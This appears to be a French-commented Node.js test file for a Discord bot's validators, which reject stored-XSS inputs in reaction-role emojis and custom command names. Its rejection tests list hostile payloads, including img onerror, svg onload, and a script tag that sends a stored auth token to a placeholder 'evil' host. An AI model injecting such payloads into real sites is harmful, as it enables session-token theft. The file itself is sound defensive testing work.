// Garde-fou des causes racines des XSS stockés.
//
// La v4.8.0 a fermé ces failles côté RENDU, en échappant les données dans le
// dashboard. Ce fichier couvre la porte par laquelle elles entraient. Les deux
// valent mieux qu'une seule : l'échappement protège une page, la validation
// protège toutes les surfaces qui liront la donnée ensuite — ici une
// description d'embed Discord et un appel à `msg.react()`.
//
// 1. L'emoji d'un panneau de rôles n'était vérifié NULLE PART. La commande
//    `/reactionrole` étant ouverte à `ManageRoles`, tout membre de l'équipe de
//    modération pouvait enregistrer `<img src=x onerror=…>` comme « emoji », et
//    le code s'exécutait au simple affichage de la page.
// 2. `/cmd create` ne faisait qu'une normalisation du nom, là où `/cmd edit`
//    passait par `validateChatInputName()` et `reservedCommandNames()`.
process.env.QUASAR_DB_PATH = ':memory:';

const { test } = require('node:test');
const assert = require('node:assert/strict');

const { validerEmoji, validerDescription } = require('../api/routes/reactionroles');
const { validateCustomCommandCreate, normalizeCustomCommandName } = require('../bot/commands/customcmd');
const { getDb } = require('../api/services/database');

test('les charges hostiles sont refusees comme emoji', () => {
    const charges = [
        '<img src=x onerror=alert(1)>',
        '"><script>fetch("//evil/"+localStorage.quasar_token)</script>',
        "'\"><svg onload=alert(1)>",
        '</select><img src=x>',
        '&lt;img&gt;',
        '`backtick`',
        'texte\navec\nretours',
    ];
    for (const charge of charges) {
        const r = validerEmoji(charge);
        assert.ok(r.error, `devrait etre refuse : ${JSON.stringify(charge)}`);
        assert.equal(r.value, undefined);
    }
});

test('les emojis legitimes passent, y compris les formes composees', () => {
    // Ces formes echappent aux proprietes Unicode evidentes : c'est pour elles
    // que la validation verifie l'innocuite plutot que de tenter de prouver
    // qu'il s'agit d'un emoji.
    const valides = [
        '🎉',            // pictogramme simple
        '1️⃣',            // touche numerique : chiffre ASCII + enceinte U+20E3
        '🇫🇷',            // drapeau : deux indicateurs regionaux
        '👨‍👩‍👧‍👦',          // famille assemblee par jointeurs de largeur nulle
        '<:ok:123456789012345678>',
        '<a:danse:123456789012345678>',
    ];
    for (const emoji of valides) {
        const r = validerEmoji(emoji);
        assert.equal(r.error, undefined, `devrait passer : ${emoji} (${r.error})`);
        assert.equal(r.value, emoji);
    }
});

test('un emoji personnalise malforme ne sert pas de cheval de Troie', () => {
    // Le format personnalise contient des chevrons : il est teste en premier, il
    // faut donc que ses classes de caracteres soient etanches.
    const faux = [
        '<:ok:123>',                              // identifiant trop court
        '<:ok:123456789012345678><img src=x>',    // suffixe apres la fermeture
        '<:o"k:123456789012345678>',              // guillemet dans le nom
        '<:ok:12345678901234567a>',               // lettre dans l identifiant
    ];
    for (const v of faux) {
        assert.ok(validerEmoji(v).error, `devrait etre refuse : ${v}`);
    }
});

test('une valeur non textuelle ou vide est refusee', () => {
    for (const v of [undefined, null, 42, {}, [], '', '   ']) {
        assert.ok(validerEmoji(v).error, `devrait etre refuse : ${JSON.stringify(v)}`);
    }
});

test('la description d une entree est bornee', () => {
    assert.equal(validerDescription(undefined).value, null);
    assert.equal(validerDescription('').value, null);
    assert.equal(validerDescription('Role de lecture').value, 'Role de lecture');
    assert.ok(validerDescription('x'.repeat(101)).error);
    assert.ok(validerDescription({}).error);
});

test('cmd create refuse ce que Discord refuserait', () => {
    const db = getDb();
    // Un nom invalide passait la creation et n echouait qu au redeploiement du
    // lot de commandes, en le faisant tomber ENTIER a cause d une seule entree.
    for (const nom of ['<img src=x onerror=alert(1)>', "apostrophe'", 'x'.repeat(40), '', '   ']) {
        const r = validateCustomCommandCreate(db, '111', nom);
        assert.ok(r.error, `devrait etre refuse : ${JSON.stringify(nom)}`);
        assert.ok(r.error.title && r.error.cause && r.error.action, 'erreur exploitable attendue');
    }
});

test('cmd create refuse un nom deja porte par une commande de Quasar', () => {
    const db = getDb();
    // Une commande personnalisee portant ce nom ne repondrait jamais et
    // disparaitrait au redemarrage suivant.
    const r = validateCustomCommandCreate(db, '111', 'ban');
    assert.ok(r.error);
    assert.match(r.error.cause, /d[ée]j[àa] une commande de Quasar/i);
});

test('la normalisation reste celle du renommage, elle ne refuse pas ce qu elle sait corriger', () => {
    // Majuscules et espaces internes sont NORMALISES, pas refuses : c est le
    // comportement documente, et il doit rester identique a celui du renommage.
    // Deux regles differentes pour la meme saisie feraient diverger les deux
    // surfaces, ce que ce fichier existe justement pour empecher.
    const db = getDb();
    const r = validateCustomCommandCreate(db, '111', 'MAJUSCULES');
    assert.equal(r.error, undefined);
    assert.equal(r.name, 'majuscules');
});

test('cmd create accepte un nom legitime et le rend normalise', () => {
    const db = getDb();
    const r = validateCustomCommandCreate(db, '111', '  Regles Du Serveur  ');
    assert.equal(r.error, undefined, r.error && r.error.cause);
    assert.equal(r.name, normalizeCustomCommandName('  Regles Du Serveur  '));
    assert.equal(r.name, 'regles-du-serveur');
});
